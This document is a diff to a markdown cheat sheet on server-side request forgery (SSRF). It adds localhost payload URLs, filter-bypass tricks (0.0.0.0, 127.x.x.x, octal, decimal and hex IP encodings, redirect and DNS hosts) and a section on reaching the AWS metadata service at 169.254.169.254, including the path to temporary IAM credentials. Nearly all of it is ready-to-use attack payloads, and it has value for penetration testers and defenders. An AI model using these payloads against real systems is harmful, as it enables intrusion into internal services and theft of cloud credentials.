@@ -1,13 +1,16 @@
 # Server-Side Request Forgery
 Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on behalf of him.
 
-## Exploit
+## Exploit with localhost
 
 Basic SSRF v1
 ```
 http://127.0.0.1:80
 http://127.0.0.1:443
 http://127.0.0.1:22
+http://0.0.0.0:80
+http://0.0.0.0:443
+http://0.0.0.0:22
 ```
 
 Basic SSRF v2
@@ -31,7 +34,7 @@ Paste URL in text field and hit enter
 Using this vulnerability users can upload images from any image URL = trigger an SSRF
 ```
 
-## Bypassing
+## Bypassing filters
 Bypass localhost with [::]
 ```
 http://[::]:80/
@@ -45,8 +48,17 @@ Bypass localhost with a domain redirecting to locahost
 http://n-pn.info
 ```
 
+Bypass localhost with CIDR : 127.x.x.x
+```
+it's a /8
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+```
+
 Bypass using a decimal ip location
 ```
+http://0177.0.0.1/
 http://2130706433/ = http://127.0.0.1
 http://3232235521/ = http://192.168.0.1
 http://3232235777/ = http://192.168.1.1
@@ -115,6 +127,43 @@ You didn't say the magic word !
 QUIT
 ```
 
+## SSRF on AWS Bucket
+Interesting path to look for at http://169.254.169.254
+```
+Always here : /latest/meta-data/{hostname,public-ipv4,...}
+User data (startup script for auto-scaling) : /latest/user-data
+Temporary AWS credentials : /latest/meta-data/iam/security-credentials/
+```
+
+DNS record
+```
+http://169.254.169.254
+http://metadata.nicob.net/
+http://169.254.169.254.xip.io/
+http://1ynrnhl.xip.io/
+http://www.owasp.org.1ynrnhl.xip.io/
+```
+
+HTTP redirect
+```
+Static:http://nicob.net/redir6a
+Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
+```
+
+Alternate IP encoding
+```
+http://425.510.425.510/ Dotted decimal with overflow
+http://2852039166/ Dotless decimal
+http://7147006462/ Dotless decimal with overflow
+http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
+http://0xA9FEA9FE/ Dotless hexadecimal
+http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
+http://0251.0376.0251.0376/ Dotted octal
+http://0251.00376.000251.0000376/ Dotted octal with padding
+```
+
+
+
 ## Thanks to
 * [Hackerone - How To: Server-Side Request Forgery (SSRF)](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
 * [Awesome URL abuse for SSRF by @orange_8361 #BHUSA](https://twitter.com/albinowax/status/890725759861403648)
@@ -122,3 +171,4 @@ QUIT
 * [SSRF Tips - xl7dev](http://blog.safebuff.com/2016/07/03/SSRF-Tips/)
 * [SSRF in https://imgur.com/vidgif/url](https://hackerone.com/reports/115748)
 * [Les Server Side Request Forgery : Comment contourner un pare-feu - @Geluchat](https://www.dailysecurity.fr/server-side-request-forgery/)
+* [AppSecEU15 Server side browsing considered harmful - @Agarri](http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
